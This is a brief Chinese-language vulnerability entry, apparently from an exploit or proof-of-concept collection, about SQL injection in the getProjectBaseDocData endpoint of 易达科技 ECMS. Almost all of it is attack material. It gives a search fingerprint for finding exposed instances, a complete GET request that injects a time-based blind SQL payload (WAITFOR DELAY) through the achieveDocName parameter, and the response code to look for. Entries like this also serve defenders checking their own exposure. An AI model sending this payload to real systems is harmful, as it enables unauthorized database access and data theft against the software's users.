# 易达科技-ECMSgetProjectBaseDocData存在SQL注入漏洞

易达科技 ｜ SQL注入 ｜ —
- **指纹**：`app="易达科技-ECMS"`
- **请求**：`GET /ecmsToBim/getProjectBaseDocData?taskId=1&isHide=&achieveDocName=1%27);WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **响应特征**：200